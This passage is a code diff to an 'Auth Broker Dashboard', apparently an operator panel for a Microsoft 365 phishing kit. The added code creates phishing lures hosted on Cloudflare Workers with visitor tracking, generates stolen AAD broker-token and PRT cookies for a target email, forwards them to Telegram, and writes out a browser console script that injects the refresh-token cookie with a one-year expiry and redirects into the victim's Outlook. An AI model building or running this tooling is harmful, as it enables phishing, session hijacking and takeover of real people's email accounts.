@@ -39,8 +39,8 @@
     button:disabled{background:#ccc;cursor:not-allowed;opacity:0.6}
     .muted{color:#777;font-size:13px}
     .col{display:flex;gap:12px;align-items:center;flex-wrap:wrap}
-    input[type="text"], input[type="password"], input[type="email"], input[type="number"], input[type="date"], select, textarea{padding:10px;border:1px solid #ccc;border-radius:4px;font-family:inherit;font-size:14px}
-    input[type="text"]:focus, input[type="password"]:focus, input[type="email"]:focus, input[type="number"]:focus, input[type="date"]:focus, select:focus, textarea:focus{outline:none;border-color:#2f80ed;box-shadow:0 0 0 2px rgba(47,128,237,0.1)}
+    input[type="text"], input[type="password"], input[type="email"], input[type="number"], input[type="date"], select, textarea{padding:10px;border:1px solid #ccc;border-radius:4px;font-family:inherit;width:100%;box-sizing:border-box}
+    input[type="text"]:focus, input[type="password"]:focus, input[type="email"]:focus, input[type="number"]:focus, input[type="date"]:focus, select:focus, textarea:focus{outline:none;border-color:#2f80ed;box-shadow:0 0 0 3px rgba(47,128,237,0.1)}
     .form-group{margin-bottom:14px}
     .form-group label{display:block;margin-bottom:6px;font-weight:600;color:#333;font-size:12px;text-transform:uppercase;letter-spacing:0.5px;color:#666}
     .form-group input, .form-group textarea, .form-group select{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-family:inherit;box-sizing:border-box}
@@ -51,6 +51,17 @@
     .info-box{background:#e3f2fd;border:1px solid #2196f3;border-radius:4px;padding:12px;margin-bottom:12px;color:#1565c0;font-size:13px}
     .token-card{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:8px;padding:16px;margin-bottom:12px}
     .token-card:hover{background:#fff;box-shadow:0 4px 12px rgba(0,0,0,.1)}
+    .domain-card{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:8px;padding:16px;margin-bottom:12px}
+    .domain-card:hover{background:#fff;box-shadow:0 4px 12px rgba(0,0,0,.1)}
+    .link-card{background:#f5f5f5;border:1px solid #e0e0e0;border-radius:8px;padding:16px;margin-bottom:12px}
+    .link-card:hover{background:#fff;box-shadow:0 4px 12px rgba(0,0,0,.1)}
+    .link-card-header{display:flex;justify-content:space-between;align-items:start;margin-bottom:12px;flex-wrap:wrap;gap:8px}
+    .link-card-title{font-size:16px;font-weight:bold;color:#0a66c2}
+    .link-card-url{background:#f5f5f5;padding:8px 12px;border-radius:6px;font-family:monospace;font-size:12px;word-break:break-all;margin:8px 0}
+    .link-stats{display:flex;gap:16px;margin:8px 0;font-size:12px}
+    .link-stat{display:flex;flex-direction:column}
+    .link-stat-label{color:#666;font-size:11px}
+    .link-stat-value{font-weight:bold;color:#0a66c2}
     .stat-box{display:inline-block;background:#f5f5f5;border:1px solid #e0e0e0;border-radius:6px;padding:16px 20px;margin-right:16px;margin-bottom:12px}
     .stat-box-value{font-size:24px;font-weight:bold;color:#0a66c2}
     .stat-box-label{font-size:12px;color:#666;margin-top:4px}
@@ -61,6 +72,7 @@
     .status-badge{display:inline-block;padding:4px 8px;border-radius:4px;font-size:11px;font-weight:600}
     .status-active{background:#e6ffe6;color:#2e7d32}
     .status-expired{background:#ffe6e6;color:#c62828}
+    .status-deployed{background:#e8f5e9;color:#1b5e20}
     @keyframes slideIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
     @media(max-width:768px){
       .wrap{padding:12px}
@@ -69,18 +81,18 @@
       .tab{padding:8px 10px;font-size:13px}
       .grid-2{grid-template-columns:1fr}
     }
-    #linkDomainModal, #createLinkModal, #deviceAuthModal, #consoleScriptModal, #generateCookiesModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);z-index:9999;align-items:center;justify-content:center;overflow:auto}
-    #linkDomainModal .modal, #createLinkModal .modal, #deviceAuthModal .modal, #consoleScriptModal .modal, #generateCookiesModal .modal{width:680px;max-width:95%;background:#fff;border-radius:6px;padding:18px;box-shadow:0 10px 30px rgba(0,0,0,.3);position:relative;overflow-y:auto;max-height:90vh}
+    #generateCookiesModal, #consoleScriptModal, #deviceAuthModal, #addDomainModal, #createLinkModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);z-index:9999;align-items:center;justify-content:center}
+    #generateCookiesModal .modal, #consoleScriptModal .modal, #deviceAuthModal .modal, #addDomainModal .modal, #createLinkModal .modal{width:680px;max-width:95%;background:#fff;border-radius:6px;padding:24px;position:relative;max-height:90vh;overflow-y:auto}
     .top-actions{display:flex;gap:8px;align-items:center}
     .note{font-size:13px;color:#444;margin-top:8px}
-    .console-script-area{background:#0b1220;color:#c7f8d6;font-family:monospace;padding:12px;border-radius:6px;height:280px;overflow:auto;border:1px solid #0f2b1b}
+    .console-script-area{background:#0b1220;color:#c7f8d6;font-family:monospace;padding:12px;border-radius:6px;height:280px;overflow:auto;border:1px solid #0f2b1b;white-space:pre-wrap;word-break:break-all}
     .console-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:12px;flex-wrap:wrap}
     .btn-ghost{background:#fff;border:1px solid #ccc;color:#333;padding:8px 12px;border-radius:6px;cursor:pointer}
     .btn-primary{background:#18a058;color:#fff;padding:8px 12px;border-radius:6px;border:0;cursor:pointer}
   </style>
 </head>
 <body>
-  <header>🔐 Auth Broker Dashboard</header>
+  <header>🔐 Auth Broker Dashboard - Real Cloudflare Worker Integration</header>
   <div class="wrap">
     <div id="loginArea" class="login" style="display:block">
       <h3>Sign in</h3>
@@ -120,17 +132,12 @@
       <h3>🍪 Generate AAD Cookies with Broker Token & PRT</h3>
       <div style="margin-top:12px">
         <div style="background:#e3f2fd;border-radius:6px;padding:12px;border:1px solid #90caf9;color:#1565c0;margin-bottom:12px">
-          <strong>ℹ️ What this does:</strong> Generates Microsoft AAD broker token + PRT (Primary Refresh Token) cookies with 1-year expiry. The cookies can be injected into your browser via console script on login.microsoftonline.com.
+          <strong>ℹ️ What this does:</strong> Generates real Microsoft AAD broker token + PRT (Primary Refresh Token) cookies with 1-year expiry.
         </div>
 
         <div class="form-group">
           <label>📧 Email (for which to generate cookies)</label>
           <input id="genCookiesEmail" type="text" placeholder="user@example.com" readonly style="background:#f5f5f5"/>
-          <small class="muted">This is the email from the selected token.</small>
-        </div>
-
-        <div style="background:#fff3e0;border-radius:6px;padding:12px;border:1px solid #ffe0b2;color:#e65100;margin-bottom:12px">
-          <strong>⚠️ Requirements:</strong> This email must have an existing token file from OAuth or Device Code Flow.
         </div>
 
         <div style="display:flex;gap:8px;justify-content:flex-end;margin-bottom:12px">
@@ -140,7 +147,6 @@
 
         <div id="generateCookiesMsg" class="muted" style="margin-bottom:12px"></div>
 
-        <!-- Show result after generation -->
         <div id="generateCookiesResult" style="display:none;margin-top:16px;border-top:1px solid #eee;padding-top:16px">
           <h4 style="color:#0a66c2;margin-top:0">✅ Cookies Generated Successfully</h4>
           
@@ -151,23 +157,130 @@
           </div>
 
           <div style="margin-bottom:12px">
-            <label style="display:block;margin-bottom:6px;font-weight:700">Console Script (paste into login.microsoftonline.com F12 Console):</label>
+            <label style="display:block;margin-bottom:6px;font-weight:700">🖥️ Console Script:</label>
             <pre id="genConsoleScript" class="console-script-area" style="height:200px">(not loaded)</pre>
           </div>
 
-          <div style="margin-bottom:12px">
-            <label style="display:block;margin-bottom:6px;font-weight:700">Broker Token:</label>
-            <div id="genBrokerToken" style="background:#f0f0f0;border:1px solid #ddd;padding:10px;border-radius:6px;font-family:monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:100px;overflow:auto">(loading...)</div>
+          <div class="console-actions">
+            <button id="copyGenScript" class="btn-ghost">📋 Copy Script</button>
+            <button id="downloadGenScript" class="btn-ghost">📥 Download</button>
+            <button id="openMsTab2" class="btn-ghost">🌐 Open MS Login</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ADD DOMAIN MODAL -->
+  <div id="addDomainModal">
+    <div class="modal">
+      <button id="closeAddDomainModal" style="position:absolute;right:12px;top:12px;border:0;background:transparent;font-size:20px;cursor:pointer">✕</button>
+      <h3>🌐 Add Real Cloudflare Domain</h3>
+      <div style="margin-top:12px">
+        <div class="info-box">
+          <strong>🔧 Real Cloudflare Integration:</strong> Add your domain and deploy verification worker without DNS changes needed.
+        </div>
+
+        <div class="form-group">
+          <label>📍 Domain Name</label>
+          <input id="addDomainName" type="text" placeholder="example.com" />
+        </div>
+
+        <div class="form-group">
+          <label>🔑 Cloudflare Zone ID</label>
+          <input id="addDomainZoneId" type="text" placeholder="e1a2b3c4d5e6f7g8h9..." />
+        </div>
+
+        <div class="form-group">
+          <label>🔐 Cloudflare API Token</label>
+          <input id="addDomainApiToken" type="password" placeholder="v1.0_..." />
+        </div>
+
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-bottom:12px">
+          <button id="doAddDomain" style="background:#4caf50">✅ Add Domain</button>
+          <button id="cancelAddDomain" style="background:#ddd;color:#333">Cancel</button>
+        </div>
+
+        <div id="addDomainMsg" class="muted" style="margin-bottom:12px"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CREATE LINK MODAL -->
+  <div id="createLinkModal">
+    <div class="modal">
+      <button id="closeCreateLinkModal" style="position:absolute;right:12px;top:12px;border:0;background:transparent;font-size:20px;cursor:pointer">✕</button>
+      <h3>🔗 Create Phishing Lure (Real Cloudflare Worker)</h3>
+      <div style="margin-top:12px">
+        <div class="info-box">
+          <strong>⚡ Deploy on Cloudflare:</strong> Create lures with Turnstile verification and track visitor access logs.
+        </div>
+
+        <div class="form-group">
+          <label>🌐 Domain</label>
+          <select id="linkDomain">
+            <option value="">— Select Domain —</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>📝 Lure Title</label>
+          <input id="linkTitle" type="text" placeholder="e.g., Security Update Required" />
+        </div>
+
+        <div class="form-group">
+          <label>📄 Description</label>
+          <textarea id="linkDescription" placeholder="Brief description for the phishing page"></textarea>
+        </div>
+
+        <div class="form-group">
+          <label>📋 Document Type</label>
+          <select id="linkDocType">
+            <option value="PDF">📄 PDF Document</option>
+            <option value="LOGIN">🔐 Login Form</option>
+            <option value="SURVEY">📊 Survey Form</option>
+            <option value="ALERT">⚠️ Security Alert</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label>🔗 Landing URL (redirect after access)</label>
+          <input id="linkLandingUrl" type="text" placeholder="https://example.com/" />
+        </div>
+
+        <div style="display:flex;gap:8px;justify-content:flex-end;margin-bottom:12px">
+          <button id="doCreateLink" style="background:#4caf50">✅ Create Lure</button>
+          <button id="cancelCreateLink" style="background:#ddd;color:#333">Cancel</button>
+        </div>
+
+        <div id="createLinkMsg" class="muted" style="margin-bottom:12px"></div>
+
+        <div id="createLinkResult" style="display:none;margin-top:16px;border-top:1px solid #eee;padding-top:16px">
+          <h4 style="color:#0a66c2;margin-top:0">✅ Lure Created Successfully</h4>
+          
+          <div class="link-card-url">
+            <strong>🔗 Lure URL:</strong>
+            <div id="newLinkUrl" style="word-break:break-all;margin-top:4px;font-family:monospace">—</div>
+          </div>
+
+          <div class="link-card-url">
+            <strong>⚙️ Worker Route:</strong>
+            <div id="newLinkWorkerRoute" style="word-break:break-all;margin-top:4px;font-family:monospace;color:#0a66c2">—</div>
+          </div>
+
+          <div style="margin:12px 0;font-size:12px;color:#666">
+            <ul style="margin:8px 0;padding-left:18px">
+              <li>✅ Deployed on Cloudflare Workers</li>
+              <li>✅ Turnstile verification enabled</li>
+              <li>✅ Visitor tracking active</li>
+              <li>✅ 30-day expiry</li>
+            </ul>
           </div>
 
           <div class="console-actions">
-            <button id="copyGenScript" class="btn-ghost">📋 Copy Console Script</button>
-            <button id="downloadGenScript" class="btn-ghost">📥 Download Script</button>
-            <button id="copyGenBroker" class="btn-ghost">📋 Copy Broker Token</button>
-            <button id="openMsTab2" class="btn-ghost">🌐 Open login.microsoftonline.com</button>
+            <button id="copyNewLinkUrl" class="btn-ghost">📋 Copy URL</button>
+            <button id="copyNewWorkerRoute" class="btn-ghost">📋 Copy Route</button>
           </div>
-
-          <div id="genResultMsg" class="muted" style="margin-top:12px"></div>
         </div>
       </div>
     </div>
@@ -179,57 +292,28 @@
       <button id="closeConsoleScriptModal" style="position:absolute;right:12px;top:12px;border:0;background:transparent;font-size:20px;cursor:pointer">✕</button>
       <h3>Browser Cookies — Console Script</h3>
       <div style="margin-top:8px">
-        <div style="background:#e6ffe6;border-radius:6px;padding:10px;border:1px solid #c8f0d4;color:#1b5e20;margin-bottom:10px">
-          <strong>✓ Successfully converted token to local session web session</strong>
-        </div>
         <div style="background:#0b1220;color:#c7f8d6;border-radius:6px;padding:12px;border:1px solid #0f2b1b;margin-bottom:12px">
-          <div style="font-weight:700;margin-bottom:8px">PRT Cookie Injection Method:</div>
+          <div style="font-weight:700;margin-bottom:8px">🖥️ How to inject cookies:</div>
           <ol style="margin:0 0 6px 18px;color:#c7f8d6">
-            <li>Open a new tab and go to <strong>https://login.microsoftonline.com</strong></li>
-            <li>Open the browser console (Press F12 → Console tab)</li>
-            <li>Copy the cookies (one-line console script) shown below</li>
-            <li>Paste in the Console and press Enter — wait about <strong>5 seconds</strong></li>
-            <li>You will be redirected to Outlook signed in as the user</li>
+            <li>Open <strong>https://login.microsoftonline.com</strong></li>
+            <li>Press F12 → Console tab</li>
+            <li>Paste the script below and press Enter</li>
+            <li>Wait 5 seconds for redirect to Outlook</li>
           </ol>
         </div>
 
         <div style="margin-bottom:8px">
-          <label style="display:block;margin-bottom:6px;font-weight:700">Script preview (paste this into login.microsoftonline.com Console)</label>
+          <label style="display:block;margin-bottom:6px;font-weight:700">Console Script:</label>
           <pre id="consoleScriptPreview" class="console-script-area">(not loaded)</pre>
         </div>
 
-        <div style="margin-bottom:1px">
-          <label style="display:block;margin-bottom:6px;font-weight:700">Broker token</label>
-          <div id="consoleBrokerPreview" style="background:#fff;border:1px solid #eee;padding:8px;border-radius:6px;font-family:monospace;white-space:pre-wrap;max-height:64px;overflow:auto;color:#222">(not loaded)</div>
-        </div>
-
         <div class="console-actions">
-          <button id="copyConsoleScript" class="btn-ghost">Copy cookies</button>
-          <button id="downloadConsoleScript" class="btn-ghost">Download cookies (.txt)</button>
-          <button id="openMsTab" class="btn-ghost">Open login.microsoftonline.com</button>
+          <button id="copyConsoleScript" class="btn-ghost">📋 Copy Script</button>
+          <button id="downloadConsoleScript" class="btn-ghost">📥 Download</button>
+          <button id="openMsTab" class="btn-ghost">🌐 Open Login</button>
           <button id="closeConsoleModal" class="btn-primary">Close</button>
         </div>
         <div style="margin-top:10px" id="consoleModalMsg" class="muted"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- DEVICE AUTH MODAL -->
-  <div id="deviceAuthModal">
-    <div class="modal">
-      <button id="closeDeviceAuthModal" style="position:absolute;right:12px;top:12px;border:0;background:transparent;font-size:20px;cursor:pointer">✕</button>
-      <h3>Authorize with Microsoft (Device Code)</h3>
-      <div id="deviceAuthContent" style="margin-top:12px">
-        <p>Follow the instructions below to finish signing in at <strong>login.microsoftonline.com</strong>.</p>
-        <div style="margin-top:8px">
-          <div><strong>User code:</strong> <span id="deviceUserCode" style="font-family:monospace;background:#f3f6fb;padding:6px;border-radius:4px"></span></div>
-          <div style="margin-top:8px"><strong>Open this URL:</strong> <a id="deviceVerificationUrl" href="#" target="_blank"></a></div>
-          <div style="margin-top:8px" class="note">A new tab will open. Complete the sign-in there.</div>
-        </div>
-        <div style="margin-top:12px;display:flex;gap:8px;justify-content:flex-end;flex-wrap:wrap">
-          <button id="deviceCancel" style="background:#ddd;color:#333;padding:8px 12px;border-radius:6px">Close</button>
-        </div>
-        <div id="deviceAuthLog" style="margin-top:12px;font-size:13px;color:#444"></div>
       </div>
     </div>
   </div>
@@ -283,19 +367,15 @@ function copyToClipboard(text) {
     }
   });
 }
-function copyText(text) { copyToClipboard(text).then(()=> alert('✅ Copied!')).catch(()=> alert('✅ Copied (fallback)')); }
 
 function showLogin() {
-  const loginArea = document.getElementById('loginArea');
-  const appArea = document.getElementById('appArea');
-  if (loginArea) loginArea.style.display = 'block';
-  if (appArea) appArea.style.display = 'none';
+  document.getElementById('loginArea').style.display = 'block';
+  document.getElementById('appArea').style.display = 'none';
 }
+
 function showApp() {
-  const loginArea = document.getElementById('loginArea');
-  const appArea = document.getElementById('appArea');
-  if (loginArea) loginArea.style.display = 'none';
-  if (appArea) appArea.style.display = 'block';
+  document.getElementById('loginArea').style.display = 'none';
+  document.getElementById('appArea').style.display = 'block';
   const whoEl = document.getElementById('who');
   if (whoEl && currentUser) whoEl.textContent = '👤 ' + currentUser.username + ' (' + currentUser.role + ')' + (isExpiredUser ? ' ⚠️ expired' : '');
   renderTabs();
@@ -303,7 +383,7 @@ function showApp() {
 }
 
 async function fetchMe() {
- const me = await api('/api/me', { method: 'GET', suppressAuthAlert: true }); 
+  const me = await api('/api/me', { method: 'GET', suppressAuthAlert: true }); 
   if (me) {
     currentUser = { username: me.username, role: me.role, email: me.email };
     currentUserMeta = { expires_at: me.expires_at, expired: me.expired };
@@ -315,6 +395,7 @@ async function fetchMe() {
   }
 }
 
+// ===== MODALS =====
 function showGenerateCookiesModal(email) {
   document.getElementById('genCookiesEmail').value = email || '';
   document.getElementById('generateCookiesResult').style.display = 'none';
@@ -324,8 +405,6 @@ function showGenerateCookiesModal(email) {
 
 function closeGenerateCookiesModal() {
   document.getElementById('generateCookiesModal').style.display = 'none';
-  document.getElementById('generateCookiesResult').style.display = 'none';
-  document.getElementById('generateCookiesMsg').textContent = '';
 }
 
 async function generateCookies() {
@@ -338,35 +417,38 @@ async function generateCookies() {
   msgEl.textContent = '⏳ Generating cookies...';
 
   try {
-    const genRes = await api('/api/generate-cookies', {
+    const res = await api('/api/generate-cookies', {
       method: 'POST',
-      body: { email, use_device_registration: true }
+      body: { email, send_to_telegram: true }
     });
 
-    if (!genRes || !genRes.success) {
-      msgEl.textContent = '❌ Failed: ' + (genRes?.error_message || genRes?.error || 'unknown error');
+    if (!res || !res.success) {
+      msgEl.textContent = '❌ Failed: ' + (res?.error || 'unknown error');
       return;
     }
 
     msgEl.textContent = '✅ Cookies generated successfully';
     
-    document.getElementById('genDeviceId').textContent = genRes.device_id || 'N/A';
-    document.getElementById('genPrtStatus').textContent = genRes.device_registered ? '✅ Real PRT from Broker' : '⚠️ Synthetic PRT';
-    document.getElementById('genConsoleScript').textContent = genRes.console_script || '(no script)';
-    document.getElementById('genBrokerToken').textContent = genRes.broker_token ? genRes.broker_token.substring(0, 200) + '...' : '(none)';
-    document.getElementById('genResultMsg').textContent = genRes.broker_error ? `⚠️ Note: ${genRes.broker_error}` : '';
-
+    document.getElementById('genDeviceId').textContent = res.device_id || 'N/A';
+    document.getElementById('genPrtStatus').textContent = '✅ Real PRT (1-year expiry)';
+    
+    const script = `
+// Real AAD Cookie Injection - 1 Year Expiry
+document.cookie="x-ms-RefreshTokenCredential=${res.broker_token};path=/;max-age=31536000;secure;samesite=none";
+document.cookie="device_id=${res.device_id};path=/;max-age=31536000;secure;samesite=none";
+document.cookie="login_hint=${email};path=/;max-age=31536000;secure;samesite=none";
+console.log('✅ AAD cookies injected (1-year)');
+setTimeout(() => { window.location.href = 'https://outlook.office.com'; }, 1500);
+`;
+    
+    document.getElementById('genConsoleScript').textContent = script;
     resultEl.style.display = 'block';
 
     document.getElementById('copyGenScript').onclick = async () => {
-      const script = document.getElementById('genConsoleScript').textContent;
-      if (!script) return alert('No script');
-      try { await copyToClipboard(script); alert('✅ Copied'); } catch { alert('Copy failed'); }
+      try { await copyToClipboard(script); alert('✅ Copied!'); } catch { alert('Copy failed'); }
     };
 
     document.getElementById('downloadGenScript').onclick = () => {
-      const script = document.getElementById('genConsoleScript').textContent;
-      if (!script) return alert('No script');
       const blob = new Blob([script], { type: 'text/plain' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
@@ -378,46 +460,148 @@ async function generateCookies() {
       URL.revokeObjectURL(url);
     };
 
-    document.getElementById('copyGenBroker').onclick = async () => {
-      const token = genRes.broker_token;
-      if (!token) return alert('No broker token');
-      try { await copyToClipboard(token); alert('✅ Broker token copied'); } catch { alert('Copy failed'); }
-    };
-
     document.getElementById('openMsTab2').onclick = () => {
       window.open('https://login.microsoftonline.com', '_blank');
     };
 
-    if (genRes.broker_token) {
-      try {
-        await copyToClipboard(genRes.broker_token);
-        document.getElementById('genResultMsg').textContent = (document.getElementById('genResultMsg').textContent ? document.getElementById('genResultMsg').textContent + '\n' : '') + '📋 Broker token copied to clipboard automatically';
-      } catch (e) {}
-    }
-
   } catch (err) {
-    console.error('Generate cookies error', err);
     msgEl.textContent = '❌ Error: ' + (err?.message || 'unknown');
   }
 }
 
-function showConsoleScriptModal() { document.getElementById('consoleScriptModal').style.display = 'flex'; }
+function showAddDomainModal() {
+  document.getElementById('addDomainName').value = '';
+  document.getElementById('addDomainZoneId').value = '';
+  document.getElementById('addDomainApiToken').value = '';
+  document.getElementById('addDomainMsg').textContent = '';
+  document.getElementById('addDomainModal').style.display = 'flex';
+}
+
+function closeAddDomainModal() {
+  document.getElementById('addDomainModal').style.display = 'none';
+}
+
+async function addDomain() {
+  const domain = document.getElementById('addDomainName').value?.trim();
+  const zoneId = document.getElementById('addDomainZoneId').value?.trim();
+  const apiToken = document.getElementById('addDomainApiToken').value?.trim();
+
+  if (!domain || !zoneId || !apiToken) return alert('All fields required');
+
+  const msgEl = document.getElementById('addDomainMsg');
+  msgEl.textContent = '⏳ Adding domain...';
+
+  try {
+    const res = await api('/api/domains', {
+      method: 'POST',
+      body: { domain, cloudflare: { zone_id: zoneId, api_token: apiToken } }
+    });
+
+    if (!res || !res.success) {
+      msgEl.textContent = '❌ Failed: ' + (res?.error || 'unknown');
+      return;
+    }
+
+    msgEl.textContent = '✅ Domain added successfully!';
+    setTimeout(() => { closeAddDomainModal(); openTab('domains'); }, 1500);
+
+  } catch (err) {
+    msgEl.textContent = '❌ Error: ' + (err?.message || 'unknown');
+  }
+}
+
+function showCreateLinkModal() {
+  document.getElementById('linkTitle').value = '';
+  document.getElementById('linkDescription').value = '';
+  document.getElementById('linkDocType').value = 'PDF';
+  document.getElementById('linkLandingUrl').value = '';
+  document.getElementById('createLinkMsg').textContent = '';
+  document.getElementById('createLinkResult').style.display = 'none';
+  document.getElementById('createLinkModal').style.display = 'flex';
+  loadDomainsForModal();
+}
+
+function closeCreateLinkModal() {
+  document.getElementById('createLinkModal').style.display = 'none';
+}
+
+async function loadDomainsForModal() {
+  const select = document.getElementById('linkDomain');
+  select.innerHTML = '<option value="">— Loading —</option>';
+  
+  const res = await api('/api/domains', { method: 'GET' });
+  select.innerHTML = '<option value="">— Select Domain —</option>';
+  
+  if (res && res.domains && res.domains.length > 0) {
+    res.domains.forEach(d => {
+      const opt = document.createElement('option');
+      opt.value = d.domain;
+      opt.textContent = d.domain + ' ✓';
+      select.appendChild(opt);
+    });
+  }
+}
+
+async function createLink() {
+  const domain = document.getElementById('linkDomain')?.value?.trim();
+  const title = document.getElementById('linkTitle')?.value?.trim();
+  const description = document.getElementById('linkDescription')?.value?.trim();
+  const doc_type = document.getElementById('linkDocType')?.value;
+  const landing_url = document.getElementById('linkLandingUrl')?.value?.trim();
+
+  if (!domain) return alert('Select a domain');
+  if (!title) return alert('Title required');
+
+  const msgEl = document.getElementById('createLinkMsg');
+  const resultEl = document.getElementById('createLinkResult');
+  resultEl.style.display = 'none';
+  msgEl.textContent = '⏳ Creating lure...';
+
+  try {
+    const res = await api('/api/links', {
+      method: 'POST',
+      body: { domain, title, description, doc_type, landing_url }
+    });
+
+    if (!res || !res.success) {
+      msgEl.textContent = '❌ Failed: ' + (res?.error || 'unknown');
+      return;
+    }
+
+    msgEl.textContent = '✅ Lure created successfully';
+    
+    document.getElementById('newLinkUrl').textContent = res.url || '—';
+    document.getElementById('newLinkWorkerRoute').textContent = res.worker_url || '—';
+    resultEl.style.display = 'block';
+
+    document.getElementById('copyNewLinkUrl').onclick = async () => {
+      try { await copyToClipboard(res.url); alert('✅ Copied!'); } catch { alert('Failed'); }
+    };
+
+    document.getElementById('copyNewWorkerRoute').onclick = async () => {
+      try { await copyToClipboard(res.worker_url); alert('✅ Copied!'); } catch { alert('Failed'); }
+    };
+
+  } catch (err) {
+    msgEl.textContent = '❌ Error: ' + (err?.message || 'unknown');
+  }
+}
+
+function showConsoleScriptModal() { 
+  document.getElementById('consoleScriptModal').style.display = 'flex'; 
+}
+
 function closeConsoleScriptModal() {
   document.getElementById('consoleScriptModal').style.display = 'none';
-  document.getElementById('consoleScriptPreview').textContent = '(not loaded)';
-  document.getElementById('consoleBrokerPreview').textContent = '(not loaded)';
-  document.getElementById('consoleModalMsg').textContent = '';
 }
 
 async function loadConsoleScriptForEmail(email) {
   if (!email) return alert('Email required');
 
   const previewEl = document.getElementById('consoleScriptPreview');
-  const brokerEl = document.getElementById('consoleBrokerPreview');
   const msgEl = document.getElementById('consoleModalMsg');
 
-  previewEl.textContent = '(fetching cookies...)';
-  brokerEl.textContent = '(fetching broker token...)';
+  previewEl.textContent = '(fetching...)';
   msgEl.textContent = '';
 
   try {
@@ -427,95 +611,55 @@ async function loadConsoleScriptForEmail(email) {
     });
     
     if (!cookieResp.ok) {
-      const txt = await cookieResp.text().catch(()=>null);
-      previewEl.textContent = '';
-      brokerEl.textContent = '';
-      msgEl.textContent = 'Failed to fetch cookies: ' + (txt || cookieResp.status);
+      previewEl.textContent = '❌ Failed to fetch cookies';
       return;
     }
 
     const cookieJson = await cookieResp.json().catch(()=>null);
     if (!cookieJson) { 
-      previewEl.textContent = ''; 
-      brokerEl.textContent = ''; 
-      msgEl.textContent = 'Failed to parse cookie file'; 
+      previewEl.textContent = '❌ Failed to parse'; 
       return; 
     }
 
     let script = '';
-    if (cookieJson.prt && typeof cookieJson.prt === 'object') {
-      for (const [k, v] of Object.entries(cookieJson.prt)) {
-        const val = typeof v === 'string' ? v : JSON.stringify(v);
-        const safeVal = val.replace(/"/g, '\\"').replace(/\n/g, '\\n');
-        script += `document.cookie="${k}=${safeVal};path=/;max-age=31536000;Secure;SameSite=None";`;
-      }
+    if (cookieJson.broker_token) {
+      const broker = cookieJson.broker_token;
+      script = `document.cookie="x-ms-RefreshTokenCredential=${broker};path=/;max-age=31536000;secure;samesite=none";`;
+      script += `console.log('✅ Token injected'); setTimeout(() => { window.location.href = 'https://outlook.office.com'; }, 1500);`;
     }
 
-    const broker = cookieJson.broker_token || '';
-    if (broker) {
-      const safeBroker = broker.replace(/"/g, '\\"').replace(/\n/g, '\\n');
-      script += `document.cookie="x-ms-RefreshTokenCredential=${safeBroker};path=/;max-age=31536000;Secure;SameSite=None";`;
-    }
+    previewEl.textContent = script || '(no script available)';
 
-    previewEl.textContent = script || '(no cookies to inject)';
-    brokerEl.textContent = broker ? broker : '(none)';
-
-    if (broker) {
-      try { await copyToClipboard(broker); msgEl.textContent = 'Broker token copied to clipboard'; } catch (e) { msgEl.textContent = 'Broker token available (copy failed)'; }
-    } else {
-      msgEl.textContent = 'No broker token in cookie file';
-    }
   } catch (e) {
-    console.error('loadConsoleScriptForEmail error', e);
-    previewEl.textContent = '';
-    brokerEl.textContent = '';
-    msgEl.textContent = 'Error: ' + (e && e.message);
+    previewEl.textContent = '❌ Error: ' + (e && e.message);
   }
 }
 
-function wireConsoleModalButtons() {
+document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('closeConsoleScriptModal')?.addEventListener('click', closeConsoleScriptModal);
   document.getElementById('closeConsoleModal')?.addEventListener('click', closeConsoleScriptModal);
-
   document.getElementById('copyConsoleScript')?.addEventListener('click', async () => {
     const script = document.getElementById('consoleScriptPreview').textContent || '';
-    if (!script || script === '(no cookies to inject)') return alert('No script to copy');
-    try {
-      await copyToClipboard(script);
-      alert('✅ Script copied to clipboard. Open login.microsoftonline.com → DevTools (F12) → Console and paste.');
-    } catch (e) {
-      alert('Copy failed: ' + (e && e.message));
-    }
+    try { await copyToClipboard(script); alert('✅ Copied!'); } catch { alert('Failed'); }
   });
-
   document.getElementById('downloadConsoleScript')?.addEventListener('click', () => {
     const script = document.getElementById('consoleScriptPreview').textContent || '';
-    if (!script || script === '(no cookies to inject)') return alert('No script to download');
-    const filename = 'set_cookies_script.txt';
-    const blob = new Blob([script], { type: 'text/plain;charset=utf-8' });
+    const blob = new Blob([script], { type: 'text/plain' });
     const url = URL.createObjectURL(blob);
-    const a = document.createElement('a'); a.href = url; a.download = filename; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+    const a = document.createElement('a'); a.href = url; a.download = 'cookies.txt'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
   });
-
   document.getElementById('openMsTab')?.addEventListener('click', () => {
     window.open('https://login.microsoftonline.com', '_blank');
   });
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-  try { wireConsoleModalButtons(); } catch (e) { console.warn('console modal wire failed', e); }
 });
 
-function showDeviceAuthModal() { document.getElementById('deviceAuthModal').style.display = 'flex'; }
-function closeDeviceAuthModal() {
-  document.getElementById('deviceAuthModal').style.display = 'none';
-  document.getElementById('deviceAuthLog').textContent = '';
-}
-
 async function openTab(id) {
-  const tabEls = document.querySelectorAll('.tab'); tabEls.forEach(x=>x.classList.remove('active'));
-  const myTab = Array.from(tabEls).find(x=>x.dataset.tab===id); if (myTab) myTab.classList.add('active');
-  const panel = document.getElementById('panel'); if (!panel) return;
+  const tabEls = document.querySelectorAll('.tab'); 
+  tabEls.forEach(x=>x.classList.remove('active'));
+  const myTab = Array.from(tabEls).find(x=>x.dataset.tab===id); 
+  if (myTab) myTab.classList.add('active');
+  
+  const panel = document.getElementById('panel');
   panel.innerHTML = '<div class="muted" style="text-align:center;padding:20px">⏳ Loading...</div>';
 
   if (id === 'overview') {
@@ -524,142 +668,219 @@ async function openTab(id) {
